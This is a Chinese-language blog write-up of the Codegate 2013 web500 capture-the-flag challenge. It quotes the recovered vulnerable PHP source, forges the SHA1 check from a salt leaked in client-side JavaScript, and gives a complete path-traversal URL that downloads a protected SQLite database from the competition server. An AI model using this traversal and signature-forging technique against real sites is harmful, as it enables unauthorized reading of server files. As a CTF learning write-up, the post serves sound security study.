---
title: Codegate2013 web500 writeup
author: yzm
layout: post
permalink: /codegate2013-web500-writeup/
categories:
  - writeup
---
# Web500

*yuzeming@gmail.com*

网站修改user-agant后才可以查看。

在网页源代码中发现一个加密的javascript[(连接)][1]  
这个文件可以使用Chrome 的调试功能进行解密。

解密后发现当我们需要访问某个页面都会通过这个JS中的load_page()函数进行加载。

    function load_page(p){
        var page = "home.html";
        switch (p) {
            case 1 : page="home.html"; break;
            case 2 : page="introduce.html"; break;
            case 3 : page="get_tag.html"; break;
        }
        window.location.href="index.php?p="+page+"&s="+calcSHA1(page+"Ace in the Hole");
    }

猜想index.php中有一个读取文件的函数，当参数p与s相对应。php就会把这个文件读取出来。  
尝试读取一下index.php本身。读取出来的主要代码如下。

    <?php
    session_start();
    $mobile_agent = '/(iPod|iPhone|Android|BlackBerry|SymbianOS|SCH-M\d+|Opera Mini|Windows CE|Nokia|SonyEricsson|webOS|PalmOS)/';
    if(!preg_match($mobile_agent, $_SERVER['HTTP_USER_AGENT'])) {
       die('mobile only...');
    }
    if (!isset($_GET['p'])){ $page = "home.html"; $sum = sha1($page."Ace in the Hole"); }else{ $page = $_GET['p']; $sum = $_GET['s'];}
    function load_page($page, $sum){
        if ($sum != sha1($page."Ace in the Hole")) {
            $page = "home.html";
        }
        return file_get_contents("./".$page);
    }
    ?>
    <?php echo load_page($page, $sum); ?>

的确可以读取任意文件，再尝试读取simulator.php 

    <?php
        session_start();
        if (!isset($_SESSION['scrap']) && !isset($_POST['name'])) die("scrap name is empty..");
        if ($_POST['name'] == "GM") die("you can not view&amp;save with 'GM'");
        if (isset($_POST['name'])) $_SESSION['scrap']=$_POST['name'];
        $db = sqlite_open("/var/game_db/gamesim_".$_SESSION['scrap'].".db");
        $row = sqlite_fetch_array(sqlite_query($db,"select 1 from sqlite_master"));
        if (isset($row[0])) {
            $row = sqlite_fetch_array(sqlite_query($db,"select * from status left join memo on status.time = memo.time order by status.time desc limit 1;"));
        }
    ?>
    
    <?php if (isset($row[0])) echo gzuncompress($row['memo.memo']); ?>

看到程序对GM的数据进行了保护。那么我们可以尝试绕过这个保护。  
不需要执行注入，可以直接下载这个/var/game\_db/gamesim\_GM.db文件。尝试使用../来跳转。

最后通过这个连接，可以下载到这个数据文件

`http://58.229.122.16:33445/site/index.php?p=../../../var/game_db/gamesim_GM.db&s=858497733a79dbc8bddd5f3f6b0fa8d0adf70049`  
这是一个Sqlite 2.1格式的数据库文件 。  
使用Sqlite官网上的管理器打开就可以读取了。  
注意读取出来的数据是经过压缩的。

 [1]: http://58.229.122.16:33445/site/main.js